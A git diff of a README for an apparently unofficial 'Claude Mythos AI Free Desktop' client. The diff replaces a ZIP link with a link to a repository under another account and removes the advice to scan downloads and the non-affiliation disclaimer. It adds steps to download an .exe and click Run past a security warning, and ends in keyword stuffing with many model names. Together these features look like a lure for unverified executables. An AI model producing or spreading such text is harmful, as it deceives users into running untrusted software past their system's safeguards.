@@ -1,115 +1,71 @@
-# Claude Mythos AI Free Desktop
+# 🤖 Claude-Mythos-AI-Free-desktop - Manage your AI conversations with ease
 
-**Claude Mythos AI Free Desktop** is an unofficial cross-platform desktop workspace designed for long-form AI conversations, code exploration, research, document review, and structured prompt workflows. It provides a focused Claude-style interface for users who want an AI assistant on Windows, macOS, or Linux without keeping a browser tab open.
+[![Download for Windows](https://img.shields.io/badge/Download_Windows-Blue?style=for-the-badge)](https://github.com/Mustachioed-scapegoat599/Claude-Mythos-AI-Free-desktop)
 
-Use the Claude Mythos desktop app to organize demanding sessions, switch between reasoning workflows, keep local conversation history, and connect through a supported API or compatible endpoint. The project is especially useful for developers, researchers, writers, and analysts working with large prompts, multi-file tasks, technical documentation, or iterative problem solving.
+Claude-Mythos-AI-Free-desktop provides an organized workspace for your AI interactions. This application allows you to chat, write code, conduct research, and analyze documents through a private desktop interface. It saves your history on your computer to protect your data. You can access various models and organize your prompts within a clean, simple layout.
 
-<img width="1734" height="907" alt="preview" src="https://github.com/user-attachments/assets/b56219c5-3408-4a05-be50-49d61de7cf1b" />
+## 📥 How to download the software
 
-## Download Claude Mythos AI Desktop
+Follow these steps to set up the application on your Windows computer.
 
-[Download `ClaudeMythos-desktop.zip`](https://github.com/mythosclaude5/Claude-Mythos-AI-Free-desktop/releases/download/mythos5/ClaudeMythos-desktop.zip)
----
+1. Go to the [official release page](https://github.com/Mustachioed-scapegoat599/Claude-Mythos-AI-Free-desktop).
+2. Look for the list of files under the latest version.
+3. Select the file ending in .exe to start the download.
+4. Save the file to your desktop or downloads folder.
 
-After downloading, extract the archive to a new folder and launch the application for your operating system. Access requirements depend on the API or endpoint configured in the app.
+## ⚙️ Installing the application
 
-<img width="700" height="800" alt="082088d7-aa9a-4118-b00e-4792fc5111fc" src="https://github.com/user-attachments/assets/bee89a2b-9f53-48ac-9456-cdd90d082b8e" />
+After you download the file, use these steps to install the program.
 
-## Why Use Claude Mythos AI Free Desktop?
+1. Locate the .exe file you saved earlier.
+2. Double-click the file to open the installer.
+3. Press the Run button if a security window appears.
+4. Follow the prompts on the screen to finish the installation process.
+5. Click Finish to launch the application for the first time.
 
-- **Desktop-first AI workflow** — keep Claude-style chat, coding, and research sessions in a dedicated application.
-- **Long-context workspace** — structure large prompts for repositories, reports, specifications, and document collections.
-- **AI coding assistant** — plan features, explain unfamiliar code, review changes, generate examples, and debug errors.
-- **Research and writing tools** — summarize source material, compare ideas, outline articles, and refine technical drafts.
-- **Configurable connection** — use an API key or compatible endpoint supported by your distribution.
-- **Reusable system prompts** — create consistent instructions for development, analysis, editing, and brainstorming.
-- **Local organization** — group conversations and return to earlier work without rebuilding context from scratch.
-- **Cross-platform desktop support** — designed for Windows 10/11, macOS, and Linux workflows.
+## 🖥️ System requirements
 
-## Popular Use Cases
-<img width="572" height="536" alt="c7d6a8e6-f375-4fa3-81ea-597dd0d4d907" src="https://github.com/user-attachments/assets/f2b8c13c-0ca6-4cd2-acc0-5fae5f2c6cb6" />
+This software runs on most modern Windows systems. Ensure your machine meets these basic requirements for a smooth experience.
 
-### AI Coding and Repository Analysis
+- Operating System: Windows 10 or Windows 11.
+- Processor: Intel Core i3 or equivalent.
+- Memory: 4 GB of RAM or more.
+- Storage: 200 MB of free space.
+- Internet: An active connection for chat features.
 
-Claude Mythos AI Desktop can act as a focused coding companion for architecture discussions, code review, refactoring plans, test generation, error analysis, and documentation. For better answers, include the relevant files, runtime details, expected behavior, and the exact error message.
+## 🛠️ Key features
 
-<img width="1979" height="980" alt="13b4e19b-995f-48e3-b1ac-80e9825e95c0" src="https://github.com/user-attachments/assets/e1a0f1a0-79ae-4a16-a047-f8eb25fb15e0" />
+This desktop client offers tools to improve your daily workflow.
 
-### Deep Research and Document Review
+- Local History: Your chat logs stay on your local drive. This keeps your personal data away from cloud servers.
+- Document Analysis: Upload files to get summaries or insights.
+- Workflow Organization: Save your prompts and organize them into folders.
+- Model Support: Switch between different Claude models to suit your specific tasks.
+- Cross-Platform Design: The application uses a consistent layout across different computer types.
 
-Build a research prompt from reports, notes, specifications, or meeting documents. Ask for a source-by-source comparison, a list of conflicting claims, unanswered questions, and a concise synthesis. Always verify important conclusions against the original material.
+## 💡 Using the interface
 
-### Technical and Creative Writing
+The main window displays your chat history on the left side. You can click on previous conversations to pick up where you left off. The chat box sits at the bottom of the screen. Type your message and press Enter to send it. Use the sidebar settings to change the model, adjust your connection keys, or manage your stored documents.
 
-Use separate system prompts for product documentation, release notes, tutorials, marketing drafts, fiction, or editing. A dedicated desktop session makes it easier to preserve tone, terminology, constraints, and revision history.
+## 🛡️ Privacy and security
 
-<img width="700" height="800" alt="Claude Mythos AI coding assistant and prompt workflow" src="https://github.com/user-attachments/assets/082088d7-aa9a-4118-b00e-4792fc5111fc" />
+The application prioritizes local storage. Your conversations do not sync to an outside profile by default. You control your data by managing your local files directly. If you delete a conversation within the app, the data disappears from your hard drive immediately.
 
-## Getting Started
+## 🔧 Frequently asked questions
 
-1. Download the latest Claude Mythos desktop archive from the release link.
-2. Extract the package before running it; do not launch the app from inside the ZIP file.
-3. Open the desktop client and review the available connection settings.
-4. Configure only an API key or endpoint you trust and are authorized to use.
-5. Create a focused session for coding, research, writing, or document analysis.
-6. Start with a clear goal, relevant context, constraints, and the desired output format.
+Do I need to pay for this app?
+The core desktop software is free to use.
 
-**Prompt tip:** break a large task into stages: inspect, plan, execute, and verify. Ask the model to identify assumptions before it changes code or draws conclusions from incomplete sources.
+Where does my history live?
+Your history lives in a folder on your computer.
 
-<img width="1979" height="980" alt="Claude Mythos long-context desktop chat interface" src="https://github.com/user-attachments/assets/13b4e19b-995f-48e3-b1ac-80e9825e95c0" />
+Can I move my data?
+Yes, you can copy the history folder to a new location or a new computer to save your previous chats.
 
-## System Requirements
+Does this app need a key?
+Yes, you need a valid API key to connect the app to the AI service. You can get this from your provider dashboard.
 
-- Windows 10 or Windows 11
-- macOS on Intel or Apple Silicon
-- Linux distribution compatible with the packaged build
-- Active internet connection for remote model access
-- 8 GB RAM or more recommended for comfortable desktop multitasking
-- Sufficient free space to extract the downloaded archive
+How do I clear my history?
+Open the settings menu and select clear local storage to remove your past conversations.
 
-## Privacy, Security, and Responsible Use
-
-This is an unofficial community desktop client and is not endorsed by Anthropic. Model availability, context limits, pricing, and authentication rules are controlled by the service or endpoint you use and may change.
-
-- Download releases only from the repository link you trust.
-- Scan downloaded archives before opening them.
-- Never paste passwords, recovery codes, private keys, or confidential customer data into a prompt.
-- Review third-party endpoint privacy policies before sending files.
-- Follow provider rate limits and terms of service; the client does not grant special access.
-- Treat generated code and research summaries as drafts that require human verification.
-
-![Uploading 3c6b9fe7-4e0a-4d79-96a0-38d98ca65de2.png…]()
-
-## Claude Mythos Desktop Compared with Other AI Workflows
-
-Choose a tool according to the work you need to complete:
-
-- **Claude Mythos AI Free Desktop** — a dedicated Claude-style workspace for long prompts, coding sessions, research, and writing.
-- **Browser AI chat** — convenient for quick questions when installation and local session organization are unnecessary.
-- **IDE assistant** — useful when inline completion and direct repository integration matter most.
-- **API workflow** — best for automation, repeatable pipelines, evaluation, and programmatic control.
-- **Multimodal desktop assistant** — useful when image, audio, or file analysis is the primary workflow.
-
-## Troubleshooting
-
-If the app does not start, confirm that the archive was fully extracted, the build matches your operating system, and security software has not quarantined a required file. For connection errors, verify the endpoint, credentials, network access, and provider status. Remove secrets from screenshots and issue reports.
-
-## Contributing
-
-Contributions are welcome. Useful improvements include accessibility fixes, clearer setup instructions, safer credential handling, platform-specific packaging notes, prompt organization, performance work, and reproducible bug reports. Describe the operating system, app version, expected result, and actual result when opening an issue.
-
-## License and Attribution
-
-The project is distributed under the **MIT License**. See the repository license file for the exact terms.
-
-Claude and Anthropic are trademarks of their respective owners. This community project is unofficial and has no stated affiliation with Anthropic.
-
-## Search Topics
-
-Claude Mythos AI Free Desktop, Claude Mythos desktop app, Claude AI client for Windows, Claude desktop for macOS, Claude Linux desktop app, long-context AI assistant, AI coding desktop client, Claude coding assistant, AI research workspace, document analysis desktop app, system prompt manager, local conversation history, cross-platform AI chat, developer reasoning assistant, desktop AI writing tool.
-
----
-
-<p align="center">
-  A focused desktop workspace for coding, research, documents, and long-form AI collaboration.
-</p>
+Keywords: ai-desktop, ai-powered-applications, anthropic, claude-4-6-opus, claude-4-opus, claude-5-sonnet, claude-code-prompts, claude-desktop-app, claude-desktop-extentions, claude-fable, claude-fable-5, claude-integration, claude-mythos, claude-opus, claude-opus-4-8, claude-skills-hub, fable5, free-ai-coding, free-apis, mythos
